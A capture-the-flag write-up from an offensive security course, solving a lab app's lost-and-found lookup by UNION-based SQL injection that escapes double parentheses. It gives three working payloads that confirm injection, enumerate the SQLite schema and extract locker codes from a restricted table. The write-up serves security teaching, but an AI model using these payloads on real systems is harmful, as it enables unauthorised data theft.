# Airline Lost and Found

**Category:** web / SQL injection (UNION-based, subquery breakout) · **Course:** Offensive Security (PoliTo)

## Vulnerability

The lost-and-found lookup runs a query shaped like:

```sql
SELECT li.item_description, li.location_found, li.reported_at, li.status,
       f.flight_number, f.origin, f.destination, f.departure_date
FROM lost_items li JOIN flights f ON li.flight_id = f.id
WHERE (li.passenger_name = (name) AND li.status = 'open')
```

where `name` is attacker-controlled and wrapped in an extra layer of parentheses, requiring a slightly different breakout than a plain single-quote.

## Exploitation

1. Break out of the double-parenthesised subquery and confirm injection with an always-true condition, pivoting to a UNION that returns SQLite's version as a canary: `')) or 1=1 UNION SELECT 1,2,sqlite_version(),4,5,6,7,8--`
2. Enumerate the schema to discover a `restricted_items` table: `')) UNION SELECT sql,2,sqlite_version(),4,5,6,7,8 from sqlite_schema--`
3. Pull the interesting columns (including a `locker_code`) straight out of it: `')) UNION SELECT id,item_description,sqlite_version(),4,locker_code,6,7,8 from restricted_items--`

The extra `))` at the start of each payload is what closes out the query's own wrapping parentheses before the injected `UNION` can be parsed as a sibling `SELECT`.

## Flag

`offsec{...redacted...}` — captured against the remote instance; redacted here per standard write-up etiquette.

## Note

Only the solution notes were preserved for this challenge (no app source retained).
